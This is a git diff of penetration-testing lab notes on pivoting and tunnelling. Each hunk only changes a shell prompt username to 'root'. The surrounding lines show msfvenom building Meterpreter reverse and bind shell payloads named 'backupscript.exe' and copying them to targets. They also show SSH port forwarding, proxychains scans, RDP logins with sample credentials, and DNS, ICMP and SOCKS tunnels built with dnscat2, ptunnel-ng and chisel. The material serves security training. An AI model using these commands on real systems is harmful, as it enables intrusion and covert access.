@@ -171,7 +171,7 @@ Whether assigned `dynamically` or `statically`, the IP address is assigned to a 
 &#x20; The Networking Behind Pivoting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ifconfig
+root@htb[/htb]$ ifconfig
 
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 134.122.100.200  netmask 255.255.240.0  broadcast 134.122.111.255
@@ -260,7 +260,7 @@ It is common to think of a network appliance that connects us to the Internet wh
 &#x20; The Networking Behind Pivoting
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ netstat -r
+root@htb[/htb]$ netstat -r
 
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
@@ -309,7 +309,7 @@ We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), wh
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64
+root@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
 Nmap scan report for 10.129.202.64
@@ -329,7 +329,7 @@ The Nmap output shows that the SSH port is open. To access the MySQL service, we
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+root@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 
 ubuntu@10.129.202.64's password: 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
@@ -367,7 +367,7 @@ The `-L` command tells the SSH client to request the SSH server to forward all t
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ netstat -antp | grep 1234
+root@htb[/htb]$ netstat -antp | grep 1234
 
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -380,7 +380,7 @@ tcp6       0      0 ::1:1234                :::*                    LISTEN      
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -v -sV -p1234 localhost
+root@htb[/htb]$ nmap -v -sV -p1234 localhost
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
 NSE: Loaded 45 scripts for scanning.
@@ -418,7 +418,7 @@ Similarly, if we want to forward multiple ports from the Ubuntu server to your l
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+root@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
 
 ***
@@ -482,7 +482,7 @@ In the above image, the attack host starts the SSH client and requests the SSH s
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
+root@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
 ```
 
 The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.
@@ -494,7 +494,7 @@ To inform proxychains that we must use port 9050, we must modify the proxychains
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tail -4 /etc/proxychains.conf
+root@htb[/htb]$ tail -4 /etc/proxychains.conf
 
 # meanwile
 # defaults set to "tor"
@@ -508,7 +508,7 @@ Now when you start Nmap with proxychains using the below command, it will route 
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
+root@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 
@@ -534,7 +534,7 @@ We will perform a remote system scan using the below command.
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19
+root@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -583,7 +583,7 @@ We can also open Metasploit using proxychains and send all associated traffic th
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ````````````````shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains msfconsole
+root@htb[/htb]$ proxychains msfconsole
 
 ProxyChains-3.1 (http://proxychains.sf.net)
                                                   
@@ -682,7 +682,7 @@ Depending on the level of access we have to this host during an assessment, we m
 &#x20; Dynamic Port Forwarding with SSH and SOCKS Tunneling
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+root@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 [13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
@@ -722,7 +722,7 @@ In these cases, we would have to find a pivot host, which is a common connection
 &#x20; Remote/Reverse Port Forwarding with SSH
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -758,7 +758,7 @@ Once our payload is created and we have our listener configured & running, we ca
 &#x20; Remote/Reverse Port Forwarding with SSH
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+root@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
 
 backupscript.exe                                   100% 7168    65.4KB/s   00:00 
 ```
@@ -790,7 +790,7 @@ Once we have our payload downloaded on the Windows host, we will use `SSH remote
 &#x20; Remote/Reverse Port Forwarding with SSH
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+root@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 
 After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
@@ -1219,7 +1219,7 @@ Socat will listen on localhost on port `8080` and forward all the traffic to por
 &#x20; Socat Redirection with a Reverse Shell
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -1236,7 +1236,7 @@ Keep in mind that we must transfer this payload to the Windows host. We can use 
 &#x20; Socat Redirection with a Reverse Shell
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfconsole
+root@htb[/htb]$ sudo msfconsole
 
 <SNIP>
 ```
@@ -1289,7 +1289,7 @@ We can create a bind shell using msfvenom with the below command.
 &#x20; Socat Redirection with a Bind Shell
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -1395,7 +1395,7 @@ One interesting usage of sshuttle is that we don't need to use proxychains to co
 &#x20; SSH Pivoting with Sshuttle
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get install sshuttle
+root@htb[/htb]$ sudo apt-get install sshuttle
 
 Reading package lists... Done
 Building dependency tree... Done
@@ -1437,7 +1437,7 @@ To use sshuttle, we specify the option `-r` to connect to the remote machine wit
 &#x20; SSH Pivoting with Sshuttle
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+root@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
 
 Starting sshuttle proxy (version 1.1.0).
 c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
@@ -1487,7 +1487,7 @@ With this command, sshuttle creates an entry in our `iptables` to redirect all t
 &#x20; SSH Pivoting with Sshuttle
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
+root@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
@@ -1572,7 +1572,7 @@ We can start our rpivot SOCKS proxy server using the below command to allow the 
 &#x20; Web Server Pivoting with Rpivot
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
+root@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
 ```
 
 **Installing Python2.7**
@@ -1580,7 +1580,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpiv
 &#x20; Web Server Pivoting with Rpivot
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get install python2.7
+root@htb[/htb]$ sudo apt-get install python2.7
 ```
 
 We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.
@@ -1590,7 +1590,7 @@ We can start our rpivot SOCKS proxy server to connect to our client on the compr
 &#x20; Web Server Pivoting with Rpivot
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+root@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 ```
 
 Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:
@@ -1600,7 +1600,7 @@ Before running `client.py` we will need to transfer rpivot to the target. We can
 &#x20; Web Server Pivoting with Rpivot
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+root@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
 ```
 
 **Running client.py from Pivot Target**
@@ -1705,7 +1705,7 @@ If dnscat2 is not already set up on our attack host, we can do so using the foll
 &#x20; DNS Tunneling with Dnscat2
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
+root@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
 
 cd dnscat2/server/
 sudo gem install bundler
@@ -1719,7 +1719,7 @@ We can then start the dnscat2 server by executing the dnscat2 file.
 &#x20; DNS Tunneling with Dnscat2
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+root@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
 
 New window created: 0
 dnscat2> New window created: crypto-debug
@@ -1752,7 +1752,7 @@ After running the server, it will provide us the secret key, which we will have 
 &#x20; DNS Tunneling with Dnscat2
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+root@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 
 Once the `dnscat2.ps1` file is on the target we can import it and run associated cmd-lets.
@@ -1853,7 +1853,7 @@ Before we can use Chisel, we need to have it on our attack host. If we do not ha
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
+root@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
 ```
 
 We will need the programming language `Go` installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use `go build` to build the Chisel binary.
@@ -1863,7 +1863,7 @@ We will need the programming language `Go` installed on our system to build the 
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cd chisel
+root@htb[/htb]$ cd chisel
 go build
 ```
 
@@ -1876,7 +1876,7 @@ Once the binary is built, we can use `SCP` to transfer it to the target pivot ho
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
+root@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
  
 ubuntu@10.129.202.64's password: 
 chisel                                        100%   11MB   1.2MB/s   00:09    
@@ -1904,7 +1904,7 @@ We can start a client on our attack host and connect to the Chisel server.
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+root@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
 
 2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
 2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
@@ -1924,7 +1924,7 @@ We can use any text editor we would like to edit the proxychains.conf file, then
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tail -f /etc/proxychains.conf 
+root@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 #
 #       proxy types: http, socks4, socks5
@@ -1945,7 +1945,7 @@ Now if we use proxychains with RDP, we can connect to the DC on the internal net
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+root@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
 ***
@@ -1963,7 +1963,7 @@ We'll start the server in our attack host with the option `--reverse`.
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+root@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 2022/05/30 10:19:16 server: Reverse tunnelling enabled
 2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
@@ -1993,7 +1993,7 @@ We can use any editor we would like to edit the proxychains.conf file, then conf
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tail -f /etc/proxychains.conf 
+root@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 [ProxyList]
 # add proxy here ...
@@ -2006,7 +2006,7 @@ If we use proxychains with RDP, we can connect to the DC on the internal network
 &#x20; SOCKS5 Tunneling with Chisel
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+root@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
 
@@ -2030,7 +2030,7 @@ If ptunnel-ng is not on our attack host, we can clone the project using git.
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
+root@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
 ```
 
 Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.sh` script located at the root of the ptunnel-ng directory.
@@ -2040,7 +2040,7 @@ Once the ptunnel-ng repo is cloned to our attack host, we can run the `autogen.s
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ./autogen.sh 
+root@htb[/htb]$ sudo ./autogen.sh 
 ```
 
 After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the `-r` option with SCP.
@@ -2050,7 +2050,7 @@ After running autogen.sh, ptunnel-ng can be used from the client and server-side
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+root@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
 ```
 
 With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
@@ -2082,7 +2082,7 @@ Back on the attack host, we can attempt to connect to the ptunnel-ng server (`-p
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+root@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 
 [inf]: Starting ptunnel-ng 1.42.
 [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
@@ -2098,7 +2098,7 @@ With the ptunnel-ng ICMP tunnel successfully established, we can attempt to conn
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
+root@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
 
 ubuntu@127.0.0.1's password: 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
@@ -2158,7 +2158,7 @@ We may also use this tunnel and SSH to perform dynamic port forwarding to allow 
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+root@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
 
 ubuntu@127.0.0.1's password: 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
@@ -2172,7 +2172,7 @@ We could use proxychains with Nmap to scan targets on the internal network (172.
 &#x20; ICMP Tunneling with SOCKS
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
+root@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
